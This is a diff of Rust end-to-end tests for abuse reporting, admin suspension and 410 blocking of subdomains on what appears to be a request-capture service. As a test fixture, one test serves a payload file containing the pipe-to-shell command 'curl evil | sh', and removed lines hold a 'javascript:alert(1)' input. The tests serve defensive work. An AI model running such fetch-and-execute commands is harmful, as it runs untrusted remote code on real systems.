@@ -1,303 +1,155 @@
-//! End-to-end tests for the subdomain blocklist.
-//!
-//! Each test starts the real router on a loopback port and talks to it over plain TCP, so
-//! the HTTP middleware, the API and the WebSocket are exercised exactly as deployed.
+//! End-to-end tests for abuse reporting and suspension, over a real HTTP server, its
+//! WebSocket, and the DNS query handler.
 
 #[cfg(test)]
 mod tests {
-    use crate::abuse::{AbuseList, Category, Source};
-    use crate::cache::Cache;
-    use crate::http::{create_router, AppState, StaticFiles};
+    use crate::abuse::Settings;
+    use crate::tests::harness::{
+        admin_settings, http, websocket, ws_recv, ws_send, Reply, TestServer, ADMIN, JSON,
+    };
     use crate::utils::config::CONFIG;
     use crate::utils::{generate_jwt, get_random_subdomain};
-    use serde_json::{json, Value};
-    use std::net::SocketAddr;
+    use serde_json::json;
     use std::sync::Arc;
-    use tempfile::TempDir;
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    use tokio::net::{TcpListener, TcpStream};
     use tokio::sync::broadcast;
 
-    const ADMIN: &str = "secret";
-    const DESCRIPTION: &str = "Loader beacons here before dropping a miner";
-    const JSON: &[(&str, &str)] = &[("Content-Type", "application/json")];
+    const REASON: &str = "Loader beacons here before dropping a miner";
+    const REPORTS: &str = "/api/v2/abuse/reports";
+    const ADMIN_API: &str = "/api/v2/abuse/admin/subdomains";
 
     fn report_body(subdomain: &str) -> String {
-        json!({
-            "subdomain": subdomain,
-            "category": "malware",
-            "description": DESCRIPTION,
-            "evidence_url": "https://threatfox.abuse.ch/ioc/1982219/",
-        })
-        .to_string()
-    }
-
-    struct TestServer {
-        addr: SocketAddr,
-        cache: Arc<Cache>,
-        abuse: Arc<AbuseList>,
-        _data_dir: TempDir,
+        json!({ "subdomain": subdomain, "category": "malware", "reason": REASON }).to_string()
     }
 
     impl TestServer {
-        async fn start(reporting_enabled: bool, admin_token: Option<&str>) -> Self {
-            let data_dir = TempDir::new().unwrap();
-            let abuse = Arc::new(
-                AbuseList::load(
-                    data_dir.path(),
-                    reporting_enabled,
-                    admin_token.map(str::to_string),
-                )
-                .await
-                .unwrap(),
-            );
-            let cache = Arc::new(Cache::new());
-            let (tx, _) = broadcast::channel(1024);
-            let state = AppState {
-                cache: cache.clone(),
-                tx: Arc::new(tx),
-                static_files: Arc::new(StaticFiles::load("./public").await),
-                http_challenge_handler: None,
-                abuse: abuse.clone(),
-            };
-
-            let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
-            let addr = listener.local_addr().unwrap();
-            tokio::spawn(async move {
-                axum::serve(
-                    listener,
-                    create_router(state).into_make_service_with_connect_info::<SocketAddr>(),
-                )
-                .await
-                .unwrap();
-            });
-
-            Self {
-                addr,
-                cache,
-                abuse,
-                _data_dir: data_dir,
-            }
-        }
-
-        /// The main domain, where the dashboard and the API live.
-        fn main_host(&self) -> String {
-            CONFIG.server_domain.clone()
-        }
-
-        /// The host a subdomain's own traffic arrives with.
-        fn subdomain_host(&self, subdomain: &str) -> String {
-            format!("{subdomain}.{}", CONFIG.server_domain)
-        }
-
-        async fn request(
-            &self,
-            method: &str,
-            host: &str,
-            target: &str,
-            headers: &[(&str, &str)],
-            body: &str,
-        ) -> Reply {
-            http(self.addr, method, host, target, headers, body).await
-        }
-
         async fn report(&self, subdomain: &str) -> Reply {
             self.request(
                 "POST",
                 &self.main_host(),
-                "/api/v2/abuse/reports",
+                REPORTS,
                 JSON,
                 &report_body(subdomain),
             )
             .await
         }
 
-        async fn admin(&self, method: &str, target: &str) -> Reply {
-            let authorization = format!("Bearer {ADMIN}");
-            self.request(
-                method,
-                &self.main_host(),
-                target,
-                &[("Authorization", authorization.as_str())],
-                "",
+        async fn suspend(&self, subdomain: &str) -> Reply {
+            self.admin(
+                "PUT",
+                &format!("{ADMIN_API}/{subdomain}"),
+                r#"{"category": "phishing"}"#,
             )
             .await
         }
-    }
 
-    /// A request to the API on the main domain, authenticated with `authorization`.
-    /// A non-empty `body` is sent as JSON.
-    async fn api(
-        server: &TestServer,
-        authorization: &str,
-        method: &str,
-        target: &str,
-        body: &str,
-    ) -> Reply {
-        let mut headers = vec![("Authorization", authorization)];
-        if !body.is_empty() {
-            headers.push(("Content-Type", "application/json"));
-        }
-        server
-            .request(method, &server.main_host(), target, &headers, body)
-            .await
-    }
-
-    struct Reply {
-        status: u16,
-        headers: Vec<(String, String)>,
-        body: String,
-    }
-
-    impl Reply {
-        fn header(&self, name: &str) -> Option<&str> {
-            self.headers
-                .iter()
-                .find(|(key, _)| key.eq_ignore_ascii_case(name))
-                .map(|(_, value)| value.as_str())
-        }
-
-        fn json(&self) -> Value {
-            serde_json::from_str(&self.body)
-                .unwrap_or_else(|e| panic!("response is not JSON ({e}): {}", self.body))
-        }
-
-        fn code(&self) -> String {
-            self.json()["code"].as_str().unwrap().to_string()
-        }
-    }
-
-    /// Sends one HTTP/1.1 request with `Connection: close` and reads the whole response.
-    async fn http(
-        addr: SocketAddr,
-        method: &str,
-        host: &str,
-        target: &str,
-        headers: &[(&str, &str)],
-        body: &str,
-    ) -> Reply {
-        let mut stream = TcpStream::connect(addr).await.unwrap();
-        let mut request =
-            format!("{method} {target} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n");
-        if !body.is_empty() {
-            request.push_str(&format!("Content-Length: {}\r\n", body.len()));
-        }
-        for (name, value) in headers {
-            request.push_str(&format!("{name}: {value}\r\n"));
-        }
-        request.push_str("\r\n");
-        stream.write_all(request.as_bytes()).await.unwrap();
-        // The server may close before a body it has already declined arrives
-        let _ = stream.write_all(body.as_bytes()).await;
-
-        let mut raw = Vec::new();
-        // A failed read says nothing on its own: say which request it belonged to
-        if let Err(e) = stream.read_to_end(&mut raw).await {
-            panic!(
-                "reading the response to {method} {target} failed after {} bytes: {e}",
-                raw.len()
-            );
-        }
-        parse_response(&raw)
-    }
-
-    fn parse_response(raw: &[u8]) -> Reply {
-        let split = raw
-            .windows(4)
-            .position(|window| window == b"\r\n\r\n")
-            .unwrap_or_else(|| {
-                panic!(
-                    "response has no header terminator: {}",
-                    String::from_utf8_lossy(raw)
-                )
-            });
-        let head = String::from_utf8_lossy(&raw[..split]).to_string();
-        let body = String::from_utf8_lossy(&raw[split + 4..]).to_string();
-
-        let mut lines = head.split("\r\n");
-        let status_line = lines.next().unwrap();
-        let status: u16 = status_line.split(' ').nth(1).unwrap().parse().unwrap();
-        let headers = lines
-            .filter_map(|line| line.split_once(": "))
-            .map(|(key, value)| (key.to_string(), value.to_string()))
-            .collect();
-        Reply {
-            status,
-            headers,
-            body,
+        async fn logged(&self, subdomain: &str) -> usize {
+            self.cache
+                .llen(&format!("requests:{subdomain}"))
+                .await
+                .unwrap()
         }
     }
 
     // --- Reporting ---------------------------------------------------------
 
     #[tokio::test]
-    async fn report_blocks_and_repeating_it_changes_nothing_visible() {
-        let server = TestServer::start(true, None).await;
-        let label = get_random_subdomain();
-
-        let first = server.report(&label).await;
-        assert_eq!(first.status, 201);
-        assert_eq!(first.json()["status"], "blocked");
-        assert_eq!(first.json()["subdomain"], label);
-        assert_eq!(first.json()["persisted"], true);
-        assert!(server.abuse.is_blocked(&label));
-
-        // Saved where an operator can find it
-        let saved: Value = serde_json::from_str(
-            &std::fs::read_to_string(server._data_dir.path().join("abuse.json")).unwrap(),
-        )
-        .unwrap();
-        assert_eq!(saved["version"], 1);
-        assert_eq!(saved["entries"][0]["subdomain"], label);
-
-        let second = server.report(&label).await;
-        assert_eq!(second.status, 200);
-        assert_eq!(second.json()["status"], "already_blocked");
-
-        let entry = server.abuse.entry(&label).unwrap();
-        assert_eq!(entry.source, Source::Report);
-        assert_eq!(entry.category, Category::Malware);
-        assert_eq!(entry.report_count, 2);
-        assert_eq!(entry.reports.len(), 2);
-        assert_eq!(entry.reports[0].description, DESCRIPTION);
-        // The exact reporter address is not kept
-        assert_eq!(entry.reports[0].network, "127.0.0.0/24");
+    async fn policy_describes_reporting_on_this_instance() {
+        let server = TestServer::start(Settings::default()).await;
+        let policy = server.main("GET", "/api/v2/abuse", &[]).await;
+        assert_eq!(policy.status, 200);
+        let policy = policy.json();
+        assert_eq!(policy["reporting_enabled"], true);
+        assert_eq!(policy["rate_limit"]["reports"], 3);
+        assert_eq!(policy["categories"][0], "malware");
     }
 
     #[tokio::test]
-    async fn report_accepts_a_url_and_rejects_bad_input_without_spending_the_budget() {
-        let server = TestServer::start(true, None).await;
-        let host = server.subdomain_host(&get_random_subdomain());
-        let api = "/api/v2/abuse/reports";
+    async fn a_report_suspends_at_once() {
+        let server = TestServer::start(admin_settings()).await;
+        let label = get_random_subdomain();
+        let host = server.subdomain_host(&label);
+        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 200);
+
+        let reply = server.report(&label).await;
+        assert_eq!(reply.status, 201, "{}", reply.body);
+        let body = reply.json();
+        assert_eq!(body["subdomain"], label.as_str());
+        assert_eq!(body["suspended"], true);
+        assert_eq!(body["already_suspended"], false);
+        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);
+
+        // Reporting it again is fine, and says so
+        let again = server.report(&label).await;
+        assert_eq!(again.status, 200);
+        assert_eq!(again.json()["already_suspended"], true);
+
+        let entry = server
+            .admin("GET", &format!("{ADMIN_API}/{label}"), "")
+            .await
+            .json();
+        assert_eq!(entry["source"], "report");
+        assert_eq!(entry["report_count"], 2);
+        assert_eq!(entry["reports"][0]["reason"], REASON);
+        assert_eq!(entry["reports"][0]["network"], "127.0.0.0/24");
+    }
+
+    #[tokio::test]
+    async fn report_accepts_a_url_or_nested_name_and_rejects_bad_input_for_free() {
+        let server = TestServer::start(Settings::default()).await;
+        let label = get_random_subdomain();
+        let host = server.subdomain_host(&label);
 
         let as_url = json!({
-            "subdomain": format!("http://{host}/bottom-xe.png"),
+            "subdomain": format!("http://x.{host}/bottom-xe.png"),
             "category": "malware",
-            "description": DESCRIPTION,
         })
         .to_string();
-        assert_eq!(
-            server
-                .request("POST", &server.main_host(), api, JSON, &as_url)
-                .await
-                .status,
-            201
-        );
+        let reply = server
+            .request("POST", &server.main_host(), REPORTS, JSON, &as_url)
+            .await;
+        assert_eq!(reply.status, 201, "{}", reply.body);
+        assert_eq!(reply.json()["subdomain"], label.as_str());
 
-        // Each of these is refused, and none of them uses up one of the three attempts
+        // Each of these is refused with a JSON error, and none of them costs an attempt
         let bad_input = [
-            json!({ "subdomain": "not-a-label", "category": "malware", "description": DESCRIPTION }),
-            json!({ "subdomain": "abcdefgh.example.org", "category": "malware", "description": DESCRIPTION }),
-            json!({ "subdomain": "abcdefgh", "category": "malware", "description": "   " }),
-            json!({ "subdomain": "abcdefgh", "category": "malware", "description": "x".repeat(1001) }),
-            json!({ "subdomain": "abcdefgh", "category": "malware", "description": DESCRIPTION, "evidence_url": "javascript:alert(1)" }),
-            json!({ "subdomain": "abcdefgh", "category": "malware", "description": DESCRIPTION, "contact": "c".repeat(201) }),
+            (
+                json!({ "subdomain": "not-a-label", "category": "malware" }),
+                "invalid_subdomain",
+            ),
+            (
+                json!({ "subdomain": "abcdefgh.example.org", "category": "malware" }),
+                "invalid_subdomain",
+            ),
+            (
+                json!({ "subdomain": "abcdefgh", "category": "malware", "reason": "x".repeat(301) }),
+                "invalid_reason",
+            ),
+            (
+                json!({ "subdomain": "abcdefgh", "category": "nonsense" }),
+                "invalid_body",
+            ),
+            // Nowhere to put a link or contact details
+            (
+                json!({ "subdomain": "abcdefgh", "category": "malware", "contact": "me" }),
+                "invalid_body",
+            ),
+            (
+                json!({ "subdomain": "abcdefgh", "category": "malware", "evidence_url": "https://x" }),
+                "invalid_body",
+            ),
         ];
-        for body in bad_input {
+        for (body, code) in bad_input {
             let reply = server
-                .request("POST", &server.main_host(), api, JSON, &body.to_string())
+                .request(
+                    "POST",
+                    &server.main_host(),
+                    REPORTS,
+                    JSON,
+                    &body.to_string(),
+                )
                 .await;
             assert_eq!(reply.status, 400, "{body}: {}", reply.body);
+            assert_eq!(reply.code(), code, "{body}");
         }
 
         // Two more reports fit in the budget of three
@@ -310,75 +162,45 @@ mod tests {
         assert_eq!(limited.code(), "rate_limited");
         let retry_after: u64 = limited.header("retry-after").unwrap().parse().unwrap();
         assert!((3595..=3600).contains(&retry_after), "{retry_after}");
-        assert_eq!(limited.json()["retry_after"], retry_after);
-        assert_eq!(limited.json()["persisted"], Value::Null);
-
-        // Still enforced a moment later: nothing was blocked by the refused request
         assert_eq!(server.abuse.blocked_count(), 3);
     }
 
     #[tokio::test]
     async fn report_demands_a_small_json_body() {
-        let server = TestServer::start(true, None).await;
-        let label = get_random_subdomain();
-        let api = "/api/v2/abuse/reports";
-        let limit = std::time::Duration::from_secs(5);
+        let server = TestServer::start(Settings::default()).await;
 
-        // Both are refused on the headers alone, so the body is never sent. If the server
-        // waited for a body it was going to refuse, these would time out.
-        let not_json = tokio::time::timeout(
-            limit,
-            server.request(
+        // `text/plain` is what a cross-site form could send without a CORS preflight
+        let not_json = server
+            .request(
                 "POST",
                 &server.main_host(),
-                api,
-                &[("Content-Type", "text/plain"), ("Content-Length", "400")],
-                "",
-            ),
-        )
-        .await
-        .expect("waited for a body that is not JSON");
+                REPORTS,
+                &[("Content-Type", "text/plain")],
+                &report_body(&get_random_subdomain()),
+            )
+            .await;
         assert_eq!(not_json.status, 415);
+        assert_eq!(not_json.code(), "unsupported_media_type");
 
-        // The limit is enforced while reading, not from the Content-Length header: one
-        // byte over it is read in full and then refused
-        let oversized = "x".repeat(16 * 1024 + 1);
-        let too_big = tokio::time::timeout(
-            limit,
-            server.request("POST", &server.main_host(), api, JSON, &oversized),
-        )
-        .await
-        .expect("did not answer a body over its limit");
+        let oversized = "x".repeat(4 * 1024 + 1);
+        let too_big = server
+            .request("POST", &server.main_host(), REPORTS, JSON, &oversized)
+            .await;
         assert_eq!(too_big.status, 413);
 
-        // JSON that parses but is not the right shape is refused too
-        let wrong_shape = server
-            .request("POST", &server.main_host(), api, JSON, "[1, 2, 3]")
-            .await;
-        assert_eq!(wrong_shape.status, 422);
-
-        assert!(!server.abuse.is_blocked(&label));
+        assert_eq!(server.abuse.blocked_count(), 0);
     }
 
     #[tokio::test]
     async fn concurrent_reports_cannot_exceed_the_rate_limit() {
-        let server = TestServer::start(true, None).await;
+        let server = TestServer::start(Settings::default()).await;
 
         let mut tasks = Vec::new();
         for _ in 0..24 {
             let body = report_body(&get_random_subdomain());
-            let host = server.main_host();
+            let (addr, host) = (server.addr, server.main_host());
             tasks.push(tokio::spawn(async move {
-                http(
-                    server.addr,
-                    "POST",
-                    &host,
-                    "/api/v2/abuse/reports",
-                    JSON,
-                    &body,
-                )
-                .await
-                .status
+                http(addr, "POST", &host, REPORTS, JSON, &body).await.status
             }));
         }
         let mut statuses = Vec::new();
@@ -392,8 +214,12 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn report_endpoint_is_not_advertised_when_disabled() {
-        let server = TestServer::start(false, None).await;
+    async fn reporting_can_be_switched_off() {
+        let server = TestServer::start(Settings {
+            reporting_enabled: false,
+            ..Settings::default()
+        })
+        .await;
 
         let reply = server.report(&get_random_subdomain()).await;
         assert_eq!(reply.status, 404);
@@ -402,236 +228,209 @@ mod tests {
 
     #[tokio::test]
     async fn report_endpoint_answers_without_cors_headers() {
-        let server = TestServer::start(true, None).await;
+        let server = TestServer::start(Settings::default()).await;
         let reply = server.report(&get_random_subdomain()).await;
 
         assert_eq!(reply.status, 201);
-        // Other API routes send these; the public report route must not, or any site
-        // could make its visitors file reports from their own addresses
+        // Other API routes send these; the public report route must not, or any site could
+        // make its visitors file reports
         assert_eq!(reply.header("access-control-allow-origin"), None);
     }
 
     // --- Admin -------------------------------------------------------------
 
     #[tokio::test]
-    async fn admin_endpoints_need_a_configured_token() {
-        let unconfigured = TestServer::start(true, None).await;
-        let reply = unconfigured
-            .request(
-                "GET",
-                &unconfigured.main_host(),
-                "/api/v2/abuse/admin/entries",
-                &[("Authorization", "Bearer anything")],
-                "",
-            )
-            .await;
+    async fn admin_api_needs_its_own_token() {
+        let unconfigured = TestServer::start(Settings::default()).await;
+        let reply = unconfigured.admin("GET", ADMIN_API, "").await;
         assert_eq!(reply.status, 403);
         assert_eq!(reply.code(), "admin_not_configured");
 
-        let configured = TestServer::start(true, Some(ADMIN)).await;
-        let entries = "/api/v2/abuse/admin/entries";
-        let host = configured.main_host();
-        let (no_token, wrong_token) = tokio::join!(
-            configured.request("GET", &host, entries, &[], ""),
-            configured.request(
-                "GET",
-                &host,
-                entries,
-                &[("Authorization", "Bearer hunter2")],
-                "",
-            ),
-        );
-        for reply in [&no_token, &wrong_token] {
-            // Missing and wrong are indistinguishable, and neither reveals the real one
-            assert_eq!(reply.status, 401);
-            assert_eq!(reply.code(), "invalid_admin_token");
-        }
+        let server = TestServer::start(admin_settings()).await;
+        let wrong = server.api("wrong-token", "GET", ADMIN_API, "").await;
+        assert_eq!(wrong.status, 401);
+        assert_eq!(wrong.code(), "invalid_admin_token");
 
-        let by_cookie = configured
-            .request(
-                "GET",
-                &configured.main_host(),
-                entries,
-                &[("Cookie", "admin_token=secret")],
-                "",
-            )
+        // A cookie is not accepted: only an explicit header
+        let cookie = format!("admin_token={ADMIN}");
+        let with_cookie = server
+            .main("GET", ADMIN_API, &[("Cookie", cookie.as_str())])
             .await;
-        assert_eq!(by_cookie.status, 200);
-        assert_eq!(by_cookie.json()["entries"], json!([]));
-    }
+        assert_eq!(with_cookie.status, 401);
 
-    #[tokio::test]
-    async fn admin_blocks_lifts_and_lists() {
-        let server = TestServer::start(true, Some(ADMIN)).await;
+        // Every admin route checks it
         let label = get_random_subdomain();
-        let entries = "/api/v2/abuse/admin/entries";
-
-        let block = json!({
-            "admin_token": ADMIN,
-            "category": "phishing",
-            "note": "Seen in a phishing kit",
-        })
-        .to_string();
-        let created = server
-            .request(
-                "POST",
-                &server.main_host(),
-                &format!("{entries}/{label}/block"),
-                JSON,
-                &block,
-            )
-            .await;
-        assert_eq!(created.status, 201);
-        assert!(server.abuse.is_blocked(&label));
-
-        // Blocking again, this time with nothing but the token: no body is needed
-        let again = server
-            .admin("POST", &format!("{entries}/{label}/block"))
-            .await;
-        assert_eq!(again.status, 200);
-        assert_eq!(again.json()["status"], "already_blocked");
-
-        // A body that cannot be parsed is refused, never treated as absent
-        let malformed = server
-            .request(
-                "POST",
-                &server.main_host(),
-                &format!("{entries}/{label}/block"),
-                JSON,
-                "{not json",
-            )
-            .await;
-        assert_eq!(malformed.status, 400);
-        assert_eq!(malformed.code(), "invalid_body");
-
-        // A body that parses but has the wrong shape is refused as well
-        let wrong_shape = server
-            .request(
-                "POST",
-                &server.main_host(),
-                &format!("{entries}/{label}/block"),
-                JSON,
-                r#"{"category": "not-a-category"}"#,
-            )
-            .await;
-        assert_eq!(wrong_shape.status, 400);
-
-        let listed = server.admin("GET", entries).await;
-        assert_eq!(listed.json()["total"], 1);
-        assert_eq!(listed.json()["entries"][0]["subdomain"], label);
-        assert_eq!(listed.json()["entries"][0]["source"], "admin");
-        assert_eq!(listed.json()["entries"][0]["category"], "phishing");
-        // The list leaves the reports out; the detail has everything
-        assert_eq!(listed.json()["entries"][0]["reports"], Value::Null);
-
-        let detail = server.admin("GET", &format!("{entries}/{label}")).await;
-        assert_eq!(detail.json()["admin_note"], "Seen in a phishing kit");
-
-        // Lifted: gone from the list, and the lift is saved
-        let lifted = server.admin("DELETE", &format!("{entries}/{label}")).await;
-        assert_eq!(lifted.status, 200);
+        for (method, target) in [
+            ("GET", format!("{ADMIN_API}/{label}")),
+            ("PUT", format!("{ADMIN_API}/{label}")),
+            ("DELETE", format!("{ADMIN_API}/{label}")),
+            ("GET", format!("{ADMIN_API}/{label}/requests")),
+            ("GET", format!("{ADMIN_API}/{label}/sources")),
+            ("DELETE", format!("{ADMIN_API}/{label}/data")),
+        ] {
+            let reply = server.api("wrong-token", method, &target, "").await;
+            assert_eq!(reply.status, 401, "{method} {target}");
+        }
         assert!(!server.abuse.is_blocked(&label));
-        assert_eq!(server.admin("GET", entries).await.json()["total"], 0);
-        assert_eq!(
-            server
-                .admin("DELETE", &format!("{entries}/{label}"))
-                .await
-                .status,
-            404
-        );
-        assert!(
-            !AbuseList::load(server._data_dir.path(), true, Some(ADMIN.into()))
-                .await
-                .unwrap()
-                .is_blocked(&label)
-        );
+
+        assert_eq!(server.admin("GET", ADMIN_API, "").await.status, 200);
     }
 
-    // --- Enforcement -------------------------------------------------------
+    #[tokio::test]
+    async fn admin_suspends_lists_updates_and_lifts() {
+        let server = TestServer::start(admin_settings()).await;
+        let label = get_random_subdomain();
+        let entry = format!("{ADMIN_API}/{label}");
+        let host = server.subdomain_host(&label);
+
+        // No body needed
+        let suspended = server.admin("PUT", &entry, "").await;
+        assert_eq!(suspended.status, 201, "{}", suspended.body);
+        assert_eq!(suspended.json()["entry"]["source"], "admin");
+        assert_eq!(suspended.json()["entry"]["category"], "other");
+        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);
+
+        // Suspending again updates the reason
+        let updated = server
+            .admin("PUT", &entry, r#"{"category": "phishing", "note": "Kit"}"#)
+            .await;
+        assert_eq!(updated.status, 200);
+        assert_eq!(updated.json()["already_suspended"], true);
+        assert_eq!(updated.json()["entry"]["category"], "phishing");
+        assert_eq!(updated.json()["entry"]["admin_note"], "Kit");
+
+        let listed = server
+            .admin("GET", &format!("{ADMIN_API}?q={}", &label[..4]), "")
+            .await
+            .json();
+        assert_eq!(listed["subdomains"][0]["subdomain"], label.as_str());
+        assert_eq!(listed["pagination"]["total"], 1);
+
+        // Lifting restores it, and the list persists across a restart
+        assert_eq!(server.admin("DELETE", &entry, "").await.status, 200);
+        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 200);
+        let lifted_again = server.admin("DELETE", &entry, "").await;
+        assert_eq!(lifted_again.status, 404);
+        assert_eq!(lifted_again.code(), "not_suspended");
+
+        server.suspend(&label).await;
+        let reloaded = crate::abuse::AbuseList::load(server.data_dir.path(), admin_settings())
+            .await
+            .unwrap();
+        assert!(reloaded.is_blocked(&label));
+    }
+
+    // --- What the owner and the world see ----------------------------------
 
     #[tokio::test]
-    async fn blocked_subdomain_traffic_is_refused_and_never_logged() {
-        let server = TestServer::start(true, Some(ADMIN)).await;
+    async fn suspended_traffic_gets_410_and_is_recorded_for_the_admin_only() {
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let host = server.subdomain_host(&label);
-        let request_log = format!("requests:{label}");
+        let token = generate_jwt(&label).unwrap();
 
-        // Before: a request is answered and logged
-        let before = server.request("GET", &host, "/", &[], "").await;
-        assert_eq!(before.status, 200);
-        assert_eq!(server.cache.llen(&request_log).await.unwrap(), 1);
+        // The owner serves a payload
+        let put = server
+            .api(
+                &token,
+                "PUT",
+                "/api/v2/files/loader.sh",
+                r#"{"body": "curl evil | sh"}"#,
+            )
+            .await;
+        assert_eq!(put.status, 201, "{}", put.body);
+        assert_eq!(
+            server
+                .request("GET", &host, "/loader.sh", &[], "")
+                .await
+                .body,
+            "curl evil | sh"
+        );
+        server.suspend(&label).await;
 
-        assert_eq!(server.report(&label).await.status, 201);
-
-        let refused = server.request("GET", &host, "/beacon", &[], "").await;
-        assert_eq!(refused.status, 410);
-        assert!(refused.body.contains("disabled for abuse"));
-        assert_eq!(refused.header("cache-control"), Some("no-store"));
-        assert_eq!(refused.header("connection"), Some("close"));
-
-        // The body is never awaited: a request that announces a megabyte and sends none
-        // of it is answered straight away
-        let announced = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            server.request(
+        for (method, path, body) in [
+            ("GET", "/loader.sh", ""),
+            (
                 "POST",
-                &host,
-                "/upload",
-                &[
-                    ("Content-Type", "application/octet-stream"),
-                    ("Content-Length", "1048576"),
-                ],
-                "",
+                "/beacon?host=victim-1",
+                "{\"hostname\": \"victim-1\"}",
             ),
-        )
-        .await
-        .expect("the server waited for the body of a blocked subdomain");
-        assert_eq!(announced.status, 410);
+            ("GET", "/api/v2/files", ""),
+        ] {
+            let reply = server
+                .request(
+                    method,
+                    &host,
+                    path,
+                    &[("Content-Type", "application/json")],
+                    body,
+                )
+                .await;
+            assert_eq!(reply.status, 410, "{method} {path}");
+            assert!(!reply.body.contains("curl evil"), "nothing is served");
+            assert_eq!(reply.header("cache-control"), Some("no-store"));
+            assert!(reply.body.starts_with("410 Gone"), "plain text for clients");
+        }
 
-        // Names below the blocked one are refused too
-        let nested = server
+        // A browser gets a page saying what happened
+        let browser = server
             .request(
                 "GET",
-                &server.subdomain_host(&format!("data.{label}")),
+                &host,
                 "/",
-                &[],
+                &[("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")],
                 "",
             )
             .await;
-        assert_eq!(nested.status, 410);
+        assert_eq!(browser.status, 410);
+        assert_eq!(
+            browser.header("content-type"),
+            Some("text/html; charset=utf-8")
+        );
+        assert!(browser.body.contains("This subdomain has been suspended"));
 
-        // The dashboard host is untouched
-        let dashboard = server
-            .request("GET", &server.main_host(), "/", &[], "")
+        // Path-based routing on the main domain is answered the same way
+        let by_path = server
+            .main("GET", &format!("/r/{label}/loader.sh"), &[])
             .await;
-        assert_ne!(dashboard.status, 410);
+        assert_eq!(by_path.status, 410);
 
-        assert_eq!(server.cache.llen(&request_log).await.unwrap(), 1);
+        // ...but every hit was recorded, body included, for the admin
+        let captured = server
+            .admin("GET", &format!("{ADMIN_API}/{label}/requests"), "")
+            .await
+            .json();
+        let beacon = captured["requests"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|r| r["path"] == "/beacon")
+            .cloned()
+            .expect("the beacon was recorded");
+        assert_eq!(beacon["query"], "?host=victim-1");
+        assert_eq!(beacon["raw"], "eyJob3N0bmFtZSI6ICJ2aWN0aW0tMSJ9");
 
-        // Lifting restores the subdomain
-        server
-            .admin("DELETE", &format!("/api/v2/abuse/admin/entries/{label}"))
-            .await;
-        let restored = server.request("GET", &host, "/", &[], "").await;
-        assert_eq!(restored.status, 200);
+        let sources = server
+            .admin("GET", &format!("{ADMIN_API}/{label}/sources"), "")
+            .await
+            .json();
+        assert_eq!(sources["unique_sources"], 1);
+        assert_eq!(sources["sources"][0]["ip"], "127.0.0.1");
+
+        // The owner cannot read them
+        let owner = server.api(&token, "GET", "/api/v2/requests", "").await;
+        assert_eq!(owner.status, 403);
+        assert_eq!(owner.code(), "subdomain_suspended");
     }
 
     #[tokio::test]
-    async fn owner_loses_access_while_blocked_and_recovers_after_a_lift() {
-        let server = TestServer::start(true, Some(ADMIN)).await;
+    async fn owner_loses_access_while_suspended_and_recovers_when_lifted() {
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let other = get_random_subdomain();
         let token = generate_jwt(&label).unwrap();
-        let bearer = format!("Bearer {token}");
 
-        assert_eq!(
-            api(&server, &bearer, "GET", "/api/v2/files", "")
-                .await
-                .status,
-            200
-        );
-
-        // A shared request link made before the block
+        // A shared request link made before the suspension
         server
             .cache
             .rpush(
@@ -640,171 +439,125 @@ mod tests {
             )
             .await
             .unwrap();
-        // No body on purpose. This endpoint reads none, and a body that reaches the server
-        // after it has closed the connection turns the close into a reset, which would make
-        // this test fail at random. Browsers keep connections alive and are not affected.
-        let shared = api(&server, &bearer, "POST", "/api/v2/requests/req-1/share", "").await;
+        // No body on purpose: this endpoint reads none, and a body arriving after the
+        // server closed the connection would turn the close into a reset.
+        let shared = server
+            .api(&token, "POST", "/api/v2/requests/req-1/share", "")
+            .await;
         assert_eq!(shared.status, 201);
         let share_target = format!(
             "/api/v2/requests/shared/{}",
             shared.json()["share_token"].as_str().unwrap()
         );
-        assert_eq!(
-            api(&server, &bearer, "GET", &share_target, "").await.status,
-            200
-        );
+        assert_eq!(server.main("GET", &share_target, &[]).await.status, 200);
 
-        assert_eq!(server.report(&label).await.status, 201);
+        server.report(&label).await;
 
-        // Bodies are valid, so that each request is refused by the block and not by a
-        // body parser that runs first
+        // Bodies are valid, so each request is refused by the suspension and not by a body
+        // parser that runs first
         for (method, target, body) in [
             ("GET", "/api/v2/files", ""),
+            ("PUT", "/api/v2/files", "{}"),
+            ("PUT", "/api/v2/files/x", r#"{"body": "x"}"#),
+            ("DELETE", "/api/v2/files/x", ""),
             ("GET", "/api/v2/dns", ""),
             ("PUT", "/api/v2/dns", r#"{"records":[]}"#),
-            ("PUT", "/api/v2/files", "{}"),
             ("GET", "/api/v2/requests", ""),
+            ("GET", "/api/v2/requests?wait=5", ""),
             ("DELETE", "/api/v2/requests", ""),
             ("GET", "/api/v2/requests/req-1", ""),
             ("DELETE", "/api/v2/requests/req-1", ""),
         ] {
-            let reply = api(&server, &bearer, method, target, body).await;
+            let reply = server.api(&token, method, target, body).await;
             assert_eq!(reply.status, 403, "{method} {target}: {}", reply.body);
-            // "Blocked", deliberately not "invalid token": the dashboard drops sessions
+            // "Suspended", deliberately not "invalid token": the dashboard drops sessions
             // whose token it considers invalid
-            assert_eq!(reply.code(), "subdomain_blacklisted");
+            assert_eq!(reply.code(), "subdomain_suspended");
             assert_eq!(reply.json()["category"], "malware");
         }
-        let link = api(&server, &bearer, "GET", &share_target, "").await;
+        let link = server.main("GET", &share_target, &[]).await;
         assert_eq!(link.status, 403);
-        assert_eq!(link.code(), "subdomain_blacklisted");
+        assert_eq!(link.code(), "subdomain_suspended");
 
-        // Other subdomains are unaffected
-        let other_authorization = format!("Bearer {}", generate_jwt(&other).unwrap());
-        let untouched = server
-            .request(
-                "GET",
-                &server.main_host(),
-                "/api/v2/files",
-                &[("Authorization", other_authorization.as_str())],
-                "",
-            )
-            .await;
-        assert_eq!(untouched.status, 200);
-
-        // The same token works again once the block is lifted
-        server
-            .admin("DELETE", &format!("/api/v2/abuse/admin/entries/{label}"))
-            .await;
+        // A new session is not affected, and never gets a suspended name
